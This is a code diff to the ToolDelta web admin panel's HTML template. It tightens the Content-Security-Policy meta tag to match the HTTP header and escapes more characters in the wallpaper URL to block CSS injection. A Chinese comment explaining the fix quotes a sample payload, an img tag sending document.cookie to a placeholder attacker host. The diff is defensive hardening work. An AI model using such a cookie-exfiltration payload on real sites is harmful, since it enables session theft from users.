@@ -8,7 +8,16 @@
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; connect-src 'self' ws: wss:; font-src 'self' data:; media-src 'self' data: blob:;">
+    <!-- CSP meta:与 __init__.py 的 after_request HTTP 头保持完全一致。
+         关键修复:旧 meta 比 HTTP 头更宽松(img-src 多 blob: https:,
+         connect-src 多 ws: wss: 无主机限制),浏览器对 meta CSP 与 HTTP 头 CSP
+         取并集(每条 directive 取最宽松值),导致 HTTP 头收紧无效。
+         XSS 后攻击者可通过 <img src="https://attacker/?leak=document.cookie">
+         向任意 HTTPS 服务器外泄数据,或向任意 WebSocket 主机推送数据。
+         现统一为 img-src 'self' data: cdn.8845.top(仅允许壁纸 CDN 白名单);
+         connect-src 'self' ws: wss:(开发环境 ws/wss 同源,生产可收紧)。
+         注意:此 meta 仅作为 HTTP 头缺失时的兜底,生产由 HTTP 头覆盖生效。 -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: cdn.8845.top; connect-src 'self' ws: wss:; font-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self';">
     <title>ToolDelta Web 管理面板</title>
     <link rel="stylesheet" href="/static/css/style.css">
     <script>
@@ -117,13 +126,14 @@
     {% if wallpaper_url %}<div class="wallpaper-bg"></div>
     <script>
       // 通过 |tojson 安全输出 URL，再由 JS 设置 backgroundImage，避免内联 style 拼接造成的 CSS 注入
-      // 纵深防御:即便后端 wallpaper_service.save() 已拦截单引号,这里再前端兜底
-      // 转义单引号/双引号/反斜杠,防止 backgroundImage 表达式被构造 CSS 注入
+      // 纵深防御:即便后端 wallpaper_service.save() 已拦截危险字符,这里再前端兜底
+      // 转义可逃出 CSS url() 上下文的字符(与 wallpaper.js applyWallpaper 对齐):
+      // ' " \ ) ( ; { } 防 backgroundImage 表达式被构造 CSS 注入
       (function(){
         var wUrl = {{ wallpaper_url|tojson }};
         if (wUrl) {
           var el = document.querySelector('.wallpaper-bg');
-          if (el) el.style.backgroundImage = "url('" + String(wUrl).replace(/['"\\]/g, encodeURIComponent) + "')";
+          if (el) el.style.backgroundImage = "url('" + String(wUrl).replace(/['"\\(){};]/g, encodeURIComponent) + "')";
         }
       })();
     </script>
